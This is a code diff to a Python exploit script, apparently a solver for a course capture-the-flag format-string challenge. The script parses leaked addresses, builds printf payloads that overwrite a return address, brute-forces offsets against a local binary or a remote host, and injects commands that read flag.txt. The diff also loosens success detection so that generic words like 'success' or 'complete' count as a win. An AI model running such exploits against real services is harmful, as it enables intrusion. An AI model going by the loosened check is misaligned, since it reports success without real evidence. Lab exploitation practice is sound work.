@@ -18,10 +18,14 @@ Typical local usage:
 from __future__ import annotations
 
 import argparse
+import os
+import select
 import re
+import secrets
 import socket
 import struct
 import subprocess
+import time
 from dataclasses import dataclass
 from pathlib import Path
 from typing import Iterable
@@ -30,15 +34,21 @@ SCRIPT_DIR = Path(__file__).resolve().parent
 DEFAULT_BINARY = str(SCRIPT_DIR.parent / "formatstring4" / "jump")
 HOST = "moa6.eecs.utk.edu"
 PORT = 32150
-PROMPT_HINT = "teleport"
-SUCCESS_MARKER = "FS_OK"
 FLAG_RE = re.compile(r"cosc[0-9-]*-flag-\{[^}]+\}", re.IGNORECASE)
+GENERIC_FLAG_RE = re.compile(r"\b[a-z][a-z0-9_-]{1,32}\{[^}\n]{4,128}\}", re.IGNORECASE)
+SUCCESS_WORD_RE = re.compile(
+    r"\b(success|correct|accepted|solved|won|complete|congratulations)\b",
+    re.IGNORECASE,
+)
 EXACT_LEAK_RE = re.compile(
     r"function\s+(?:0x)?([0-9a-fA-F]{7,8}),\s*(?:0x)?([0-9a-fA-F]{7,8})",
     re.IGNORECASE,
 )
 HEX_RE = re.compile(r"0x([0-9a-fA-F]{7,8})")
-DEFAULT_CMD = f"echo {SUCCESS_MARKER}\ncat flag.txt 2>/dev/null || true\nexit\n"
+DEFAULT_CMD_TEMPLATE = "echo {token}\ncat flag.txt 2>/dev/null || true\nexit\n"
+READY_TIMEOUT = 6.0
+IDLE_TIMEOUT = 0.2
+POST_TIMEOUT = 1.0
 
 
 @dataclass(frozen=True)
@@ -78,7 +88,11 @@ def parse_leaks(text: str) -> tuple[int, int]:
         for v in vals:
             if code_addr is None and is_code_addr(v) and (code_hint or not stack_hint):
                 code_addr = v
-            if stack_addr is None and is_stack_addr(v) and (stack_hint or not code_hint):
+            if (
+                stack_addr is None
+                and is_stack_addr(v)
+                and (stack_hint or not code_hint)
+            ):
                 stack_addr = v
 
         if code_addr is not None and stack_addr is not None:
@@ -97,7 +111,11 @@ def parse_leaks(text: str) -> tuple[int, int]:
 
 
 def iter_attempts(ret_offset_forced: int | None) -> Iterable[Attempt]:
-    offsets = [ret_offset_forced] if ret_offset_forced is not None else list(range(24, 121, 4))
+    offsets = (
+        [ret_offset_forced]
+        if ret_offset_forced is not None
+        else list(range(24, 121, 4))
+    )
     arg_pairs = [(1, 2), (2, 1), (3, 4), (4, 3), (5, 6), (6, 5), (7, 8), (8, 7)]
     for off in offsets:
         for idx_a, idx_b in arg_pairs:
@@ -115,7 +133,9 @@ def _fmt_write(total_printed: int, want: int, arg_idx: int) -> tuple[str, int]:
     return part, total_printed
 
 
-def build_payload(target_addr: int, buffer_addr: int, attempt: Attempt) -> tuple[bytes, dict[str, int]]:
+def build_payload(
+    target_addr: int, buffer_addr: int, attempt: Attempt
+) -> tuple[bytes, dict[str, int]]:
     ret_addr = (buffer_addr + attempt.ret_offset) & 0xFFFFFFFF
     low = target_addr & 0xFFFF
     high = (target_addr >> 16) & 0xFFFF
@@ -156,39 +176,101 @@ def build_payload(target_addr: int, buffer_addr: int, attempt: Attempt) -> tuple
     return payload, info
 
 
-def read_until_prompt_local(proc: subprocess.Popen[bytes]) -> str:
+def read_until_banner_local(proc: subprocess.Popen[bytes]) -> str:
     out = b""
+    deadline = time.monotonic() + READY_TIMEOUT
+    fd = None
+    if proc.stdout is not None:
+        fd = proc.stdout.fileno()
     while True:
-        if proc.stdout is None:
+        if proc.stdout is None or fd is None:
             raise RuntimeError("failed to open local stdout")
-        ch = proc.stdout.read(1)
-        if not ch:
+        remaining = deadline - time.monotonic()
+        if remaining <= 0:
             break
-        out += ch
+        ready, _, _ = select.select([fd], [], [], min(IDLE_TIMEOUT, remaining))
+        if not ready:
+            if out:
+                break
+            continue
+        chunk = os.read(fd, 256)
+        if not chunk:
+            break
+        out += chunk
         txt = out.decode("latin1", errors="ignore")
-        if PROMPT_HINT in txt.lower():
-            return txt
         try:
             parse_leaks(txt)
+            return txt
         except RuntimeError:
             continue
     return out.decode("latin1", errors="ignore")
 
 
-def read_until_prompt_remote(sock: socket.socket) -> str:
+def read_until_banner_remote(sock: socket.socket) -> str:
     out = b""
+    deadline = time.monotonic() + READY_TIMEOUT
     while True:
-        ch = sock.recv(1)
-        if not ch:
+        remaining = deadline - time.monotonic()
+        if remaining <= 0:
             break
-        out += ch
+        sock.settimeout(min(IDLE_TIMEOUT, remaining))
+        try:
+            chunk = sock.recv(256)
+        except socket.timeout:
+            if out:
+                break
+            continue
+        if not chunk:
+            break
+        out += chunk
         txt = out.decode("latin1", errors="ignore")
-        if PROMPT_HINT in txt.lower():
-            return txt
         try:
             parse_leaks(txt)
+            return txt
         except RuntimeError:
             continue
+    return out.decode("latin1", errors="ignore")
+
+
+def read_tail_local(proc: subprocess.Popen[bytes], timeout: float = POST_TIMEOUT) -> str:
+    if proc.stdout is None:
+        return ""
+    fd = proc.stdout.fileno()
+    out = b""
+    deadline = time.monotonic() + timeout
+    while True:
+        remaining = deadline - time.monotonic()
+        if remaining <= 0:
+            break
+        ready, _, _ = select.select([fd], [], [], min(IDLE_TIMEOUT, remaining))
+        if not ready:
+            if out:
+                break
+            continue
+        chunk = os.read(fd, 4096)
+        if not chunk:
+            break
+        out += chunk
+    return out.decode("latin1", errors="ignore")
+
+
+def read_tail_remote(sock: socket.socket, timeout: float = POST_TIMEOUT) -> str:
+    out = b""
+    deadline = time.monotonic() + timeout
+    while True:
+        remaining = deadline - time.monotonic()
+        if remaining <= 0:
+            break
+        sock.settimeout(min(IDLE_TIMEOUT, remaining))
+        try:
+            chunk = sock.recv(4096)
+        except socket.timeout:
+            if out:
+                break
+            continue
+        if not chunk:
+            break
+        out += chunk
     return out.decode("latin1", errors="ignore")
 
 
@@ -199,7 +281,7 @@ def run_local_once(binary: str, payload: bytes, cmd: bytes) -> str:
         stdout=subprocess.PIPE,
         stderr=subprocess.STDOUT,
     )
-    banner = read_until_prompt_local(p)
+    banner = read_until_banner_local(p)
     if p.stdin is None or p.stdout is None:
         raise RuntimeError("failed to open local pipes")
     p.stdin.write(payload + cmd)
@@ -213,7 +295,7 @@ def run_remote_once(host: str, port: int, payload: bytes, cmd: bytes) -> str:
     sock = socket.create_connection((host, port), timeout=8)
     sock.settimeout(6)
     try:
-        banner = read_until_prompt_remote(sock)
+        banner = read_until_banner_remote(sock)
         sock.sendall(payload + cmd)
         body = b""
         try:
@@ -229,10 +311,14 @@ def run_remote_once(host: str, port: int, payload: bytes, cmd: bytes) -> str:
     return banner + body.decode("latin1", errors="ignore")
 
 
-def looks_like_success(text: str) -> bool:
-    if SUCCESS_MARKER in text:
+def looks_like_success(text: str, token: str | None = None) -> bool:
+    if token and token in text:
         return True
     if FLAG_RE.search(text):
+        return True
+    if GENERIC_FLAG_RE.search(text):
+        return True
+    if SUCCESS_WORD_RE.search(text):
         return True
     return False
 
@@ -244,13 +330,37 @@ def trim_preview(text: str, max_chars: int = 400) -> str:
 
 
 def main() -> None:
-    ap = argparse.ArgumentParser(description="adaptive format-string return-overwrite helper")
-    ap.add_argument("--mode", choices=["auto", "local", "remote"], default="auto")
-    ap.add_argument("--host", default=HOST)
-    ap.add_argument("--port", type=int, default=PORT)
+    ap = argparse.ArgumentParser(
+        description="adaptive format-string return-overwrite helper"
+    )
+    ap.add_argument(
+        "--mode",
+        choices=["auto", "local", "remote"],
+        default="local",
+        help="target mode (default: local)",
+    )
+    ap.add_argument(
+        "--host", default=HOST, help="remote host (used when --mode remote or auto)"
+    )
+    ap.add_argument(
+        "--port",
+        type=int,
+        default=PORT,
+        help="remote port (used when --mode remote or auto)",
+    )
     ap.add_argument("--binary", default=DEFAULT_BINARY)
     ap.add_argument("--ret-offset", type=int, default=None)
-    ap.add_argument("--cmd", default=DEFAULT_CMD)
+    ap.add_argument(
+        "--cmd",
+        default=None,
+        help="post-overwrite command sequence; default auto-generates a per-run token + flag read",
+    )
+    ap.add_argument(
+        "--max-seconds",
+        type=float,
+        default=12.0,
+        help="overall search time budget in seconds (default: 12)",
+    )
     ap.add_argument("--show-fail-preview", action="store_true")
     args = ap.parse_args()
 
@@ -258,10 +368,17 @@ def main() -> None:
     if args.mode == "auto":
         modes = ["remote", "local"]
 
+    success_token = f"AUTO_OK_{secrets.token_hex(6)}"
+    cmd_text = args.cmd if args.cmd is not None else DEFAULT_CMD_TEMPLATE.format(token=success_token)
+    cmd_bytes = cmd_text.encode("ascii", errors="ignore")
+
     last_error: Exception | None = None
+    deadline = time.monotonic() + args.max_seconds
     for mode in modes:
         # Read one fresh banner per attempt because ASLR and stack layout can vary run-to-run.
         for attempt in iter_attempts(args.ret_offset):
+            if time.monotonic() >= deadline:
+                raise RuntimeError("exploit search timed out before finding success")
             try:
                 if mode == "local":
                     # Open once to parse current leaks, then rerun that same process with payload.
@@ -271,7 +388,7 @@ def main() -> None:
                         stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT,
                     )
-                    banner = read_until_prompt_local(p)
+                    banner = read_until_banner_local(p)
                     target_addr, buffer_addr = parse_leaks(banner)
                     payload, info = build_payload(target_addr, buffer_addr, attempt)
                     if info["payload_len"] > 31:
@@ -282,31 +399,24 @@ def main() -> None:
                         if p.poll() is None:
                             p.kill()
                         raise RuntimeError("failed to open local pipes")
-                    p.stdin.write(payload + args.cmd.encode("ascii"))
+                    p.stdin.write(payload + cmd_bytes)
                     p.stdin.flush()
                     p.stdin.close()
-                    rest = p.stdout.read().decode("latin1", errors="ignore")
+                    rest = read_tail_local(p)
+                    if p.poll() is None:
+                        p.kill()
                     output = banner + rest
                 else:
                     sock = socket.create_connection((args.host, args.port), timeout=8)
-                    sock.settimeout(6)
                     try:
-                        banner = read_until_prompt_remote(sock)
+                        banner = read_until_banner_remote(sock)
                         target_addr, buffer_addr = parse_leaks(banner)
                         payload, info = build_payload(target_addr, buffer_addr, attempt)
                         if info["payload_len"] > 31:
                             continue
-                        sock.sendall(payload + args.cmd.encode("ascii"))
-                        body = b""
-                        try:
-                            while True:
-                                chunk = sock.recv(4096)
-                                if not chunk:
-                                    break
-                                body += chunk
-                        except socket.timeout:
-                            pass
-                        output = banner + body.decode("latin1", errors="ignore")
+                        sock.sendall(payload + cmd_bytes)
+                        body = read_tail_remote(sock)
+                        output = banner + body
                     finally:
                         sock.close()
 
@@ -322,7 +432,7 @@ def main() -> None:
                     )
                 )
 
-                if looks_like_success(output):
+                if looks_like_success(output, success_token):
                     print(output)
                     return
 
